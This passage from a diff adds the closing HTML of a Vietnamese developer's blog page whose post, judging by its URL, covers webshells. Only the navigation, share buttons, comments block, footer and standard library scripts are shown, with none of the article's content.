+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/2019/06/toi-da-chiem-quyen-admin-cua-mot-trang-web-nhu-the-nao-loi-canh-bao-cho-nhung-trang-web-dang-de-api-mo/" data-tooltip="Tôi đã chiếm quyền admin của một trang web như thế nào? Lời cảnh báo cho những trang web đang để api mở!">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">Trước</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://manhnv.com/2019/06/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://manhnv.com/2019/06/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://manhnv.com/2019/06/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2020 <a href="https://facebook.com/nguyenmanh1997">Nguyễn Mạnh</a><a href="//www.dmca.com/Protection/Status.aspx?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e" title="DMCA.com Protection Status" class="dmca-badge"> <img src ="https://images.dmca.com/Badges/dmca_protected_sml_120m.png?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e"  alt="DMCA.com Protection Status" /></a>  <script src="https://images.dmca.com/Badges/DMCABadgeHelper.min.js"> </script>. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/2019/06/csrf-cross-site-request-forgery-la-gi-lam-the-nao-de-ngan-chan-tan-cong-csrf/" data-tooltip="CSRF (cross site request forgery) là gì? Làm thế nào để ngăn chặn tấn công CSRF?">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">Tiếp</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://manhnv.com/2019/06/toi-da-chiem-quyen-admin-cua-mot-trang-web-nhu-the-nao-loi-canh-bao-cho-nhung-trang-web-dang-de-api-mo/" data-tooltip="Tôi đã chiếm quyền admin của một trang web như thế nào? Lời cảnh báo cho những trang web đang để api mở!">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">Trước</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://manhnv.com/2019/06/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://manhnv.com/2019/06/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://manhnv.com/2019/06/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmanhnv.com%2F2019%2F06%2Fwebshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell%2F">
+          <i class="fa fa-facebook-official"></i><span>Chia sẻ với Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fmanhnv.com%2F2019%2F06%2Fwebshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell%2F">
+          <i class="fa fa-twitter"></i><span>Chia sẻ với Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Fmanhnv.com%2F2019%2F06%2Fwebshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell%2F">
+          <i class="fa fa-google-plus"></i><span>Chia sẻ với Google&#43;</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://manhnv.com/images/about/nguyenmanh.jpg" alt="Ảnh đại diện" />
+    
+    <h4 id="about-card-name">Nguyễn Mạnh</h4>
+    
+      <div id="about-card-bio">Chia sẻ là niềm vui</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Dev
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        VietNam
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://manhnv.com/images/cover.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://manhnv.com/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/manhnv.com\/2019\/06\/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell\/';
+          
+            this.page.identifier = '\/2019\/06\/webshell-la-gi-lam-the-nao-de-upload-su-dung-mot-webshell\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'nguyen-manh';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
